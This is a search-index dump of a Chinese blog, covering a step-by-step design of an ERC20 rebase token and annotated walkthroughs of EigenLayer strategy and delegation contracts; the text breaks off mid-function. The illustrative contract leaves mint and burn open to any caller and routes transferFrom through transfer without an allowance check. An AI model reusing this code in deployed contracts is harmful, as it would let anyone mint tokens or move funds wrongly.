[{"categories":["system design"],"content":" 1 基础框架","date":"2024-04-09","objectID":"/erc20-rebase/:1:0","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#1-基础框架"},{"categories":["system design"],"content":" 背景ERC20 Rebase机制是在ERC20协议基础之上衍生的，用来对代币持有者做激励分红，这里将以ethereum-credit-guild项目中设计的ERC20RebaseDistributor合约为基础，讲解Rebase机制的设计与实现思路。 在ecg中，ERC20RebaseDistributor合约是作为底层的creditToken，类比到其他借贷协议，creditToken等同于compound中的cToken，是lender的质押凭证，也是生息资产，针对不同的抵押物都有一个绑定的creditToken，质押者可以通过持有creditToken来累积收益。 ","date":"2024-04-09","objectID":"/erc20-rebase/:1:1","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#背景"},{"categories":["system design"],"content":" 功能分析在ERC20RebaseDistributor合约中并不是默认所有holder都持有生息资产，而是将参与rebase和非rebase的分开，显然分红只针对参与rebase的holder展开，如图所示，ERC20Rebase由rebasingSupply和nonRebasingSupply两部分构成 这里我们总结出下面的恒等式： totalSupply() == nonRebasingSupply() + rebasingSupply() sum of balanceOf(x) == totalSupply() 接下来，再分析分红机制，在ecg协议中，存在一个合约来汇总单个creditToken的收益，并按照比例把一部分token转为对参与rebase的holder分红，这里的分红逻辑也很直接，每个参与rebase的用户根据当前余额来瓜分分红额度即可。 至此，我们的ERC20Rebase基础设计已经明确，需要提供enter/exit rebase方法和分红distribute方法，具体的代码如下所示（注：这里只实现关键逻辑，仍有缺漏）： 定义 rebasingAccounts(array) rebasingAccount(mapping) 来跟踪参与rebase的地址 定义 rebasingSupply 来记录所有参与rebase的供应量 enterRebase 函数：将该地址标记为参与rebase，累加rebase供应量 exitRebase 函数：取消参与rebase的标记，扣减rebase供应量 distribute 函数：先将分红数额销毁，再按照比例mint给所有参与rebase的地址 solidity function enterRebase() external { require(!rebasingAccount[msg.sender], \"SimpleERC20Rebase: already rebasing\"); uint256 balance = balanceOf(msg.sender); rebasingAccount[msg.sender] = true; rebasingSupply += balance; rebasingAccounts.push(msg.sender); } function exitRebase() external { require(rebasingAccount[msg.sender], \"SimpleERC20Rebase: not rebasing\"); uint256 balance = balanceOf(msg.sender); rebasingAccount[msg.sender] = false; rebasingSupply -= balance; for (uint256 i = 0; i \u003c rebasingAccounts.length; i++) { if (rebasingAccounts[i] == msg.sender) { rebasingAccounts[i] = rebasingAccounts[rebasingAccounts.length - 1]; rebasingAccounts.pop(); break; } } } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); for (uint256 i = 0; i \u003c rebasingAccounts.length; i++) { uint256 delta = amount * balanceOf(rebasingAccounts[i]) / rebasingSupply; _mint(rebasingAccounts[i], delta); } rebasingSupply += amount; } function mint(address user, uint256 amount) external { return _mint(user, amount); } 最基础的rebase分红机制已经实现了，回顾上面的代码，存在非常关键的问题：如果参与rebase的地址很多，每次分红都会有大量的mint操作，成本过高，系统无法拓展 ","date":"2024-04-09","objectID":"/erc20-rebase/:1:2","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#功能分析"},{"categories":["system design"],"content":" 完整代码 solidity // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity 0.8.13; import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; contract SimpleERC20Rebase is ERC20 { mapping(address =\u003e bool) internal rebasingAccount; address[] internal rebasingAccounts; uint256 public rebasingSupply; constructor( string memory _name, string memory _symbol ) ERC20(_name, _symbol) {} function nonRebasingSupply() public view returns (uint256) { return totalSupply() - rebasingSupply; } function enterRebase() external { require(!rebasingAccount[msg.sender], \"SimpleERC20Rebase: already rebasing\"); uint256 balance = balanceOf(msg.sender); rebasingAccount[msg.sender] = true; rebasingSupply += balance; rebasingAccounts.push(msg.sender); } function exitRebase() external { require(rebasingAccount[msg.sender], \"SimpleERC20Rebase: not rebasing\"); uint256 balance = balanceOf(msg.sender); rebasingAccount[msg.sender] = false; rebasingSupply -= balance; for (uint256 i = 0; i \u003c rebasingAccounts.length; i++) { if (rebasingAccounts[i] == msg.sender) { rebasingAccounts[i] = rebasingAccounts[rebasingAccounts.length - 1]; rebasingAccounts.pop(); break; } } } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); for (uint256 i = 0; i \u003c rebasingAccounts.length; i++) { uint256 delta = amount * balanceOf(rebasingAccounts[i]) / rebasingSupply; _mint(rebasingAccounts[i], delta); } rebasingSupply += amount; } function mint(address user, uint256 amount) external { return _mint(user, amount); } } ","date":"2024-04-09","objectID":"/erc20-rebase/:1:3","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#完整代码"},{"categories":["system design"],"content":" 2 Share与Balance","date":"2024-04-09","objectID":"/erc20-rebase/:2:0","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#2-share与balance"},{"categories":["system design"],"content":" 引出Share我们需要针对上面提出的问题进行优化，通过观察分红机制可以看出，所有account对应的balance都是按比例增加，那么这里的循环更新是否有存在的必要呢？是否可以全局记录一个系数，每次调用distribute时只更新这个系数，要查询balance时，乘上这个系数即可 那么这里就拆分出两个概念，balance和share，并且衍生出sharePrice，对于所有进入rebase的用户都只记录share，并且有一个全局的sharePrice，查询用户balance时需要根据share和sharePrice计算出balance，sharePrice在分红时增加 针对第一个版本，我们梳理一下需要修改的部分和积攒的问题： 需要记录每个参与rebase的地址的share share与balance如何映射 sharePrice在每次分红时如何累加 具体的改动如下： 将mapping的value拓展为结构体，记录share 将rebasingSupply改为totalShares 定义初始sharePrice=1e30 solidity struct RebasingState { bool isRebasing; uint256 nShares; } mapping(address =\u003e RebasingState) internal rebasingAccount; uint256 public totalShares; uint256 public sharePrice = 1e30; 用下面的函数处理share和balance的映射关系： solidity function rebasingSupply() public view returns (uint256) { return share2Balance(totalShares); } function nonRebasingSupply() public view returns (uint256) { return totalSupply() - rebasingSupply(); } function share2Balance(uint256 shares) view public returns (uint256) { return shares * sharePrice / 1e30; } function balance2Share(uint256 balance) view public returns (uint256) { return balance * 1e30 / sharePrice ; } 继续改写enter/exit和distribute部分： enter时先把balance转换为share，更新rebase记录 exit时把share转换为balance，移除rebase记录 distribute时，先销毁token，再更新sharePrice solidity function _enterRebase(address user) internal { uint256 balance = balanceOf(user); uint256 shares = balance2Share(balance); rebasingAccount[user].isRebasing = true; rebasingAccount[user].nShares = shares; totalShares += shares; emit RebaseEnter(user, shares, block.timestamp); } function _exitRebase(address user) internal { uint256 shares = rebasingAccount[user].nShares; rebasingAccount[user].isRebasing = false; rebasingAccount[user].nShares = 0; totalShares -= shares; emit RebaseExit(user, shares, block.timestamp); } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); sharePrice += amount*1e30 / totalShares; } ","date":"2024-04-09","objectID":"/erc20-rebase/:2:1","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#引出share"},{"categories":["system design"],"content":" ERC20方法重写同时，我们需要对ERC20的几个方法进行重写： balanceOf：对于参与rebase的用户需要用share转换到balance mint burn transfer transferFrom：对于相关用户，如果之前参与rebase的需要先exit，操作后再enter solidity function balanceOf(address account) public view override returns (uint256) { uint256 rawBalance = ERC20.balanceOf(account); if (rebasingAccount[account].isRebasing) { return share2Balance(rebasingAccount[account].nShares); } else { return rawBalance; } } function mint(address user, uint256 amount) external { bool isRebasing = rebasingAccount[user].isRebasing; if (isRebasing) { _exitRebase(user); } ERC20._mint(user, amount); if (isRebasing) { _enterRebase(user); } } function burn(address user, uint256 amount) external { bool isRebasing = rebasingAccount[user].isRebasing; if (isRebasing) { _exitRebase(user); } ERC20._burn(user, amount); if (isRebasing) { _enterRebase(user); } } function transfer(address to, uint256 amount) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[msg.sender].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _enterRebase(to); } return result; } function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[from].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _enterRebase(to); } return result; } ","date":"2024-04-09","objectID":"/erc20-rebase/:2:2","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#erc20方法重写"},{"categories":["system design"],"content":" 遗留的问题大致逻辑已经实现了，用户的balance也能通过share和sharePrice来正确计算，我们再来看是否满足了前面的恒等式： totalSupply() == nonRebasingSupply() + rebasingSupply() rebasingSupply可以用当前的share和sharePrice计算出，但是totalSupply我们没有重写，totalSupply=nonRebasingSupply，以distribute为例，nonRebasingSupply减少了，但是share不变，sharePrice还增加了，那么显然totalSupply小于rebasingSupply sum of balanceOf(x) == totalSupply() 同理，用户的share不变但是sharePrice增加了，显然totalSupply也偏小 那么缺少的这部分是什么？ ","date":"2024-04-09","objectID":"/erc20-rebase/:2:3","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#遗留的问题"},{"categories":["system design"],"content":" Code solidity // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity 0.8.13; import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; contract SimpleERC20Rebase is ERC20 { event RebaseEnter(address indexed account, uint256 indexed shares, uint256 indexed timestamp); event RebaseExit(address indexed account, uint256 indexed shares, uint256 indexed timestamp); struct RebasingState { bool isRebasing; uint256 nShares; } mapping(address =\u003e RebasingState) internal rebasingAccount; uint256 public totalShares; uint256 public sharePrice = 1e30; constructor( string memory _name, string memory _symbol ) ERC20(_name, _symbol) {} function rebasingSupply() public view returns (uint256) { return share2Balance(totalShares); } function nonRebasingSupply() public view returns (uint256) { return totalSupply() - rebasingSupply(); } function share2Balance(uint256 shares) view public returns (uint256) { return shares * sharePrice / 1e30; } function balance2Share(uint256 balance) view public returns (uint256) { return balance * 1e30 / sharePrice ; } function enterRebase() external { require(!rebasingAccount[msg.sender].isRebasing, \"SimpleERC20Rebase: already rebasing\"); _enterRebase(msg.sender); } function _enterRebase(address user) internal { uint256 balance = balanceOf(user); uint256 shares = balance2Share(balance); rebasingAccount[user].isRebasing = true; rebasingAccount[user].nShares = shares; totalShares += shares; emit RebaseEnter(user, shares, block.timestamp); } function exitRebase() external { require(rebasingAccount[msg.sender].isRebasing, \"SimpleERC20Rebase: not rebasing\"); _exitRebase(msg.sender); } function _exitRebase(address user) internal { uint256 shares = rebasingAccount[user].nShares; rebasingAccount[user].isRebasing = false; rebasingAccount[user].nShares = 0; totalShares -= shares; emit RebaseExit(user, shares, block.timestamp); } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); sharePrice += amount*1e30 / totalShares; } function balanceOf(address account) public view override returns (uint256) { uint256 rawBalance = ERC20.balanceOf(account); if (rebasingAccount[account].isRebasing) { return share2Balance(rebasingAccount[account].nShares); } else { return rawBalance; } } function mint(address user, uint256 amount) external { bool isRebasing = rebasingAccount[user].isRebasing; if (isRebasing) { _exitRebase(user); } ERC20._mint(user, amount); if (isRebasing) { _enterRebase(user); } } function burn(address user, uint256 amount) external { bool isRebasing = rebasingAccount[user].isRebasing; if (isRebasing) { _exitRebase(user); } ERC20._burn(user, amount); if (isRebasing) { _enterRebase(user); } } function transfer(address to, uint256 amount) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[msg.sender].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _enterRebase(to); } return result; } function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[from].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _enterRebase(to); } return result; } } ","date":"2024-04-09","objectID":"/erc20-rebase/:2:4","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#code"},{"categories":["system design"],"content":" 3 补偿铸造","date":"2024-04-09","objectID":"/erc20-rebase/:3:0","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#3-补偿铸造"},{"categories":["system design"],"content":" 实际例子我们以实际例子展开，假设A、B均开启rebase，且初始balance和share均为100，C未开启rebase，balance为200 此时的状态如下，可见是满足等式条件的： totalSupply = 100 + 100 + 200 = 400 sharePrice = 1 rebasingSupply = (100 + 100) * 1 = 200 nonRebasingSupply = 200 那么C调用distribute来贡献自己的200 token，状态变化为： totalSupply = 100 + 100 - 200 = 0 sharePrice = 1 + (200/200) = 2 rebasingSupply = (100 + 100) * 2 = 400 nonRebasingSupply = 0 此时显然等式不再成立，为了保证等式成立，totalSupply应该是400而不是0，回到第一个版本，我们每次调用distribute时都会通过_mint来修改每个参与rebase用户的balance，实际上系统是增发了，因为前面进行了销毁操作，因此保持了平衡 那么在第二版中，前面也进行了销毁，但是却没有增发，只是更新sharePrice，那么就算用户账面上的balance增加了，但是实际来领取时，系统总量是不够的。因此，这里差的400就是需要增发的量，同理我们不需要按比例增发给每个用户，而是记录在一个全局变量中，当用户退出rebase时再mint出相应的数额 ","date":"2024-04-09","objectID":"/erc20-rebase/:3:1","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#实际例子"},{"categories":["system design"],"content":" 补偿铸造首先定义全局的unminted变量： solidity uint256 public unminted; unminted需要在distribute时增加，在exit时减少： solidity function _exitRebase(address user) internal { uint256 shares = rebasingAccount[user].nShares; rebasingAccount[user].isRebasing = false; rebasingAccount[user].nShares = 0; totalShares -= shares; uint256 balance = share2Balance(shares); uint256 rawBalance = ERC20.balanceOf(user); if (balance \u003e rawBalance) { uint256 delta = balance - rawBalance; ERC20._mint(user, delta); unminted -= delta; } emit RebaseExit(user, shares, block.timestamp); } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); sharePrice += amount*1e30 / totalShares; unminted += amount; } 修改后的代码如下，我们新增了unminted变量，并在distribute时累加，在exit时增发相应数目token给用户 至此，ERC20Rebase的核心框架已经实现了，不过代码仅供参考，只关注了核心逻辑的实现，对比ecg中的ERC20RebaseDistributor合约，我们仍欠缺很关键的部分：线性释放，分红的token不是一次性反馈给holder，而是在一定的周期内线性增加。 由于添加了时间的维度，相应的也会衍生出许多问题：如果分红周期内share总量发生变化，如何保证公平分发？ ","date":"2024-04-09","objectID":"/erc20-rebase/:3:2","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#补偿铸造"},{"categories":["system design"],"content":" Code solidity // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity 0.8.13; import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; contract SimpleERC20Rebase is ERC20 { event RebaseEnter(address indexed account, uint256 indexed shares, uint256 indexed timestamp); event RebaseExit(address indexed account, uint256 indexed shares, uint256 indexed timestamp); struct RebasingState { bool isRebasing; uint256 nShares; } mapping(address =\u003e RebasingState) internal rebasingAccount; uint256 public totalShares; uint256 public unminted; uint256 public sharePrice = 1e30; constructor( string memory _name, string memory _symbol ) ERC20(_name, _symbol) {} function rebasingSupply() public view returns (uint256) { return share2Balance(totalShares); } function nonRebasingSupply() public view returns (uint256) { return totalSupply() - rebasingSupply(); } function share2Balance(uint256 shares) view public returns (uint256) { return shares * sharePrice / 1e30; } function balance2Share(uint256 balance) view public returns (uint256) { return balance * 1e30 / sharePrice ; } function enterRebase() external { require(!rebasingAccount[msg.sender].isRebasing, \"SimpleERC20Rebase: already rebasing\"); _enterRebase(msg.sender); } function _enterRebase(address user) internal { uint256 balance = balanceOf(user); uint256 shares = balance2Share(balance); rebasingAccount[user].isRebasing = true; rebasingAccount[user].nShares = shares; totalShares += shares; emit RebaseEnter(user, shares, block.timestamp); } function exitRebase() external { require(rebasingAccount[msg.sender].isRebasing, \"SimpleERC20Rebase: not rebasing\"); _exitRebase(msg.sender); } function _exitRebase(address user) internal { uint256 shares = rebasingAccount[user].nShares; rebasingAccount[user].isRebasing = false; rebasingAccount[user].nShares = 0; totalShares -= shares; uint256 balance = share2Balance(shares); uint256 rawBalance = ERC20.balanceOf(user); if (balance \u003e rawBalance) { uint256 delta = balance - rawBalance; ERC20._mint(user, delta); unminted -= delta; } emit RebaseExit(user, shares, block.timestamp); } function distribute(uint256 amount) external { require(balanceOf(msg.sender)\u003e=amount, \"SimpleERC20Rebase: not enough\"); _burn(msg.sender, amount); sharePrice += amount*1e30 / totalShares; unminted += amount; } function totalSupply() public view override returns (uint256) { return super.totalSupply() + unminted; } function balanceOf(address account) public view override returns (uint256) { uint256 rawBalance = ERC20.balanceOf(account); if (rebasingAccount[account].isRebasing) { return share2Balance(rebasingAccount[account].nShares); } else { return rawBalance; } } function mint(address user, uint256 amount) external { bool isRebasing = rebasingAccount[user].isRebasing; if (isRebasing) { _exitRebase(user); } ERC20._mint(user, amount); if (isRebasing) { _enterRebase(user); } } function transfer(address to, uint256 amount) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[msg.sender].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(msg.sender); } if (isToRebasing \u0026\u0026 to != msg.sender) { _enterRebase(to); } return result; } function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { bool isFromRebasing = rebasingAccount[from].isRebasing; bool isToRebasing = rebasingAccount[to].isRebasing; if (isFromRebasing) { _exitRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _exitRebase(to); } bool result = ERC20.transfer(to, amount); if (isFromRebasing) { _enterRebase(from); } if (isToRebasing \u0026\u0026 to != from) { _enterRebase(to); } return result; } } ","date":"2024-04-09","objectID":"/erc20-rebase/:3:3","series":null,"tags":null,"title":"ERC20 Rebase的设计与实现","uri":"/erc20-rebase/#code-1"},{"categories":["Defi"],"content":" Strategy ","date":"2024-02-05","objectID":"/eigenlayer-analysis/:1:0","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#strategy"},{"categories":["Defi"],"content":" StrategyBase由StrategyBase和StrategyBaseTVLLimits构成，StrategyBase是基础逻辑，StrategyBaseTVLLimits继承自StrategyBase且在此基础之上拓展。 StrategyBase的核心方法就是deposit和withdraw，分别提供质押和提取功能，用户质押入token，会获得相应份额的shares，提取时再根据shares计算出应得的token数量 deposit方法 solidity function deposit( IERC20 token, uint256 amount ) external virtual override onlyWhenNotPaused(PAUSED_DEPOSITS) onlyStrategyManager returns (uint256 newShares) { // 要求deposit未暂停，且只有strategyManager可以调用 // call hook to allow for any pre-deposit logic _beforeDeposit(token, amount); // deposit前的hook，在本合约内是虚函数，需要继承的合约去实现 // 每个strategy只支持一个底层token require(token == underlyingToken, \"StrategyBase.deposit: Can only deposit underlyingToken\"); // copy `totalShares` value to memory, prior to any change uint256 priorTotalShares = totalShares; /** * @notice calculation of newShares *mirrors* `underlyingToShares(amount)`, but is different since the balance of `underlyingToken` * has already been increased due to the `strategyManager` transferring tokens to this strategy prior to calling this function */ // account for virtual shares and balance // 计算virtual的share和token总额度，这里都加上了OFFSET，用来避免shares膨胀攻击，后面会介绍 uint256 virtualShareAmount = priorTotalShares + SHARES_OFFSET; uint256 virtualTokenBalance = _tokenBalance() + BALANCE_OFFSET; // calculate the prior virtual balance to account for the tokens that were already transferred to this contract uint256 virtualPriorTokenBalance = virtualTokenBalance - amount; // 按照比例计算本次质押的amount可以得到多少新的shares newShares = (amount * virtualShareAmount) / virtualPriorTokenBalance; // extra check for correctness / against edge case where share rate can be massively inflated as a 'griefing' sort of attack require(newShares != 0, \"StrategyBase.deposit: newShares cannot be zero\"); // 更新累加的总shares // update total share amount to account for deposit totalShares = (priorTotalShares + newShares); return newShares; } withdraw方法 solidity function withdraw( address recipient, IERC20 token, uint256 amountShares ) external virtual override onlyWhenNotPaused(PAUSED_WITHDRAWALS) onlyStrategyManager { // 要求withdraw未暂停，且只有strategyManager可以调用 // call hook to allow for any pre-withdrawal logic _beforeWithdrawal(recipient, token, amountShares); require(token == underlyingToken, \"StrategyBase.withdraw: Can only withdraw the strategy token\"); // copy `totalShares` value to memory, prior to any change uint256 priorTotalShares = totalShares; require( // 不得提取超出上限的shares amountShares \u003c= priorTotalShares, \"StrategyBase.withdraw: amountShares must be less than or equal to totalShares\" ); /** * @notice calculation of amountToSend *mirrors* `sharesToUnderlying(amountShares)`, but is different since the `totalShares` has already * been decremented. Specifically, notice how we use `priorTotalShares` here instead of `totalShares`. */ // account for virtual shares and balance // 同样加上OFFSET统一处理 uint256 virtualPriorTotalShares = priorTotalShares + SHARES_OFFSET; uint256 virtualTokenBalance = _tokenBalance() + BALANCE_OFFSET; // calculate ratio based on virtual shares and balance, being careful to multiply before dividing // 计算提取出amountShares，可以得到多少token uint256 amountToSend = (virtualTokenBalance * amountShares) / virtualPriorTotalShares; // Decrease the `totalShares` value to reflect the withdrawal // 更新最新的总份额数 totalShares = priorTotalShares - amountShares; // 把相应数额的token转移给接收方 underlyingToken.safeTransfer(recipient, amountToSend); } StrategyBaseTVLLimits继承自StrategyBase，当前eigenlayer主网的所有底层策略都是基于本合约实现的。 本合约内加了两个变量：maxPerDeposit和maxTotalDeposits maxPerDeposit：限制单次deposit的上限 maxTotalDeposits：限制累计的deposit上限 ","date":"2024-02-05","objectID":"/eigenlayer-analysis/:1:1","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#strategybase"},{"categories":["Defi"],"content":" StrategyManagerStrategy合约中的deposit和withdraw方法都限制仅strategyManager调用，strategyManager主要包括两个合约代码： StrategyManagerStorage：抽象合约，用于定义基础变量 StrategyManager：继承自StrategyManagerStorage，实现核心逻辑 StrategyManager对外方法较多，按照调用方划分，分为无权限校验，仅delegationManager调用，仅owner调用，仅strategyWhitelister调用 任何人可以直接调用的 depositIntoStrategy：转移token到strategy，累增shares solidity function _depositIntoStrategy( address staker, IStrategy strategy, IERC20 token, uint256 amount ) internal onlyStrategiesWhitelistedForDeposit(strategy) returns (uint256 shares) { // 仅限白名单内的策略 // transfer tokens from the sender to the strategy // 直接转移token到strategy合约 token.safeTransferFrom(msg.sender, address(strategy), amount); // 调用strategy的deposit方法 // deposit the assets into the specified strategy and get the equivalent amount of shares in that strategy shares = strategy.deposit(token, amount); // add the returned shares to the staker's existing shares for this strategy // 累加用户在指定strategy下的shares _addShares(staker, strategy, shares); // Increase shares delegated to operator, if needed // 调用delegation，尝试累加deposit shares delegation.increaseDelegatedShares(staker, strategy, shares); emit Deposit(staker, token, strategy, shares); return shares; } depositIntoStrategyWithSignature：校验链下签名，再调用到_depositIntoStrategy solidity function depositIntoStrategyWithSignature( IStrategy strategy, IERC20 token, uint256 amount, address staker, uint256 expiry, bytes memory signature ) external onlyWhenNotPaused(PAUSED_DEPOSITS) nonReentrant returns (uint256 shares) { // 校验签名未过期 require(expiry \u003e= block.timestamp, \"StrategyManager.depositIntoStrategyWithSignature: signature expired\"); // calculate struct hash, then increment `staker`'s nonce // 累增nonce，按照规则计算hash uint256 nonce = nonces[staker]; bytes32 structHash = keccak256(abi.encode(DEPOSIT_TYPEHASH, strategy, token, amount, nonce, expiry)); unchecked { nonces[staker] = nonce + 1; } // calculate the digest hash bytes32 digestHash = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator(), structHash)); /** * check validity of signature: * 1) if `staker` is an EOA, then `signature` must be a valid ECDSA signature from `staker`, * indicating their intention for this action * 2) if `staker` is a contract, then `signature` will be checked according to EIP-1271 */ // 校验签名是否来自于staker EIP1271SignatureUtils.checkSignature_EIP1271(staker, digestHash, signature); // deposit the tokens (from the `msg.sender`) and credit the new shares to the `staker` // 调用到底层deposit方法 shares = _depositIntoStrategy(staker, strategy, token, amount); } 仅delegationManager调用 removeShares：扣除用户在指定strategy下的shares addShares：增加用户在指定strategy下的shares withdrawSharesAsTokens：调用strategy的withdraw方法 migrateQueuedWithdrawal：deprecated 仅owner调用 setStrategyWhitelister：设置strategyWhitelister 仅strategyWhitelister调用 addStrategiesToDepositWhitelist：新增strategy到whitelist removeStrategiesFromDepositWhitelist：从whitelist中移除strategy 可以看到StrategyManager核心的功能是 对外提供deposit和withdraw方法：deposit无限制，withdraw只有delegationManager调用 记录用户的shares 用白名单管理strategy ","date":"2024-02-05","objectID":"/eigenlayer-analysis/:1:2","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#strategymanager"},{"categories":["Defi"],"content":" Core","date":"2024-02-05","objectID":"/eigenlayer-analysis/:2:0","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#core"},{"categories":["Defi"],"content":" DelegationManagerStrategyManager的几个方法被限制仅由delegationManager调用，delegationManager的合约代码由两部分组成： DelegationManagerStorage：抽象合约，定义变量 DelegationManager：继承自DelegationManagerStorage，实现核心逻辑 核心的对外方法如下，根据调用者分为下面几组：代理商、用户、AVS、strategyManager或eigenPodManager 代理商 registerAsOperator：注册成为operator，任何人都可以注册 modifyOperatorDetails：修改operator的属性 updateOperatorMetadataURI：更新metadata，发出event 用户 delegateTo：把资产代理给代理商 solidity function _delegate( address staker, address operator, SignatureWithExpiry memory approverSignatureAndExpiry, bytes32 approverSalt ) internal onlyWhenNotPaused(PAUSED_NEW_DELEGATION) { // 只能代理给一个operator require(!isDelegated(staker), \"DelegationManager._delegate: staker is already actively delegated\"); // staker自己不能是operator require(isOperator(operator), \"DelegationManager._delegate: operator is not registered in EigenLayer\"); // fetch the operator's `delegationApprover` address and store it in memory in case we need to use it multiple times // 获取代理商的approver地址，这个地址用于颁发签名给用户，在下面用来做校验 address _delegationApprover = _operatorDetails[operator].delegationApprover; /** * Check the `_delegationApprover`'s signature, if applicable. * If the `_delegationApprover` is the zero address, then the operator allows all stakers to delegate to them and this verification is skipped. * If the `_delegationApprover` or the `operator` themselves is the caller, then approval is assumed and signature verification is skipped as well. */ if (_delegationApprover != address(0) \u0026\u0026 msg.sender != _delegationApprover \u0026\u0026 msg.sender != operator) { // check the signature expiry require( // 校验签名是否过期 approverSignatureAndExpiry.expiry \u003e= block.timestamp, \"DelegationManager._delegate: approver signature expired\" ); // check that the salt hasn't been used previously, then mark the salt as spent require( // 校验salt是否被使用过 !delegationApproverSaltIsSpent[_delegationApprover][approverSalt], \"DelegationManager._delegate: approverSalt already spent\" ); // 标记此approver的salt为已使用 delegationApproverSaltIsSpent[_delegationApprover][approverSalt] = true; // calculate the digest hash bytes32 approverDigestHash = calculateDelegationApprovalDigestHash( staker, operator, _delegationApprover, approverSalt, approverSignatureAndExpiry.expiry ); // 校验签名是否有效 // actually check that the signature is valid EIP1271SignatureUtils.checkSignature_EIP1271( _delegationApprover, approverDigestHash, approverSignatureAndExpiry.signature ); } // record the delegation relation between the staker and operator, and emit an event // 记录代理关系 delegatedTo[staker] = operator; emit StakerDelegated(staker, operator); // 获取用户当前已质押的strategy和对应的数目 (IStrategy[] memory strategies, uint256[] memory shares) = getDelegatableShares(staker); for (uint256 i = 0; i \u003c strategies.length;) { // 把之前的质押累加到代理商的记录上 _increaseOperatorShares({ operator: operator, staker: staker, strategy: strategies[i], shares: shares[i] }); unchecked { ++i; } } } delegateToBySignature：同上，先校验签名再delegate undelegate：取消代理 solidity function undelegate(address staker) external onlyWhenNotPaused(PAUSED_ENTER_WITHDRAWAL_QUEUE) returns (bytes32[] memory withdrawalRoots) { // 校验之前存在代理记录 require(isDelegated(staker), \"DelegationManager.undelegate: staker must be delegated to undelegate\"); // 不能是代理商 require(!isOperator(staker), \"DelegationManager.undelegate: operators cannot be undelegated\"); require(staker != address(0), \"DelegationManager.undelegate: cannot undelegate zero address\"); address operator = delegatedTo[staker]; require( // 允许以下条件调用：质押人自己 or 代理商 or 代理商的授权地址 msg.sender == staker || msg.sender == operator || msg.sender == _operatorDetails[operator].delegationApprover, \"DelegationManager.undelegate: caller cannot undelegate staker\" ); // Gather strategies and shares to remove from staker/operator during undelegation // Undelegation removes ALL currently-active strategies and shares // 获取当前代理的策略及shares信息 (IStrategy[] memory strategies, uint256[] memory shares) = getDelegatableShares(staker); // emit an event if this action was not initiated by the staker them","date":"2024-02-05","objectID":"/eigenlayer-analysis/:2:1","series":null,"tags":null,"title":"EigenLayer 合约解析","uri":"/eigenlayer-analysis/#delegationmanager"},{"categories":["Defi"],"content":" 